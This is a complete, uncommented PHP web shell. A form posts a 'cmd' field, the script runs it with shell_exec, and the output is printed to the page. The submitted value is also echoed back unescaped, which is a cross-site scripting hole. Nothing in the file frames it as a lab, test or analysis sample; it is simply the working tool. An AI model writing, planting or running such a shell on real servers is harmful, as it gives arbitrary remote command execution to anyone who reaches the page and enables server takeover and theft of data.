<?php
  
  @session_start();
  $page =$_SERVER["PHP_SELF"];
  $cmd = $_POST["cmd"];

  $result = shell_exec($cmd);

  $result = str_replace("\n","<br>",$result);
  $_SESSION = array();
?>

<form action= <?=$page?> method="POST">
  <input type="text" name="cmd" value=<?=$cmd?>>
  <input type="submit" value="exec">
</form>

<hr>

<?=$result?>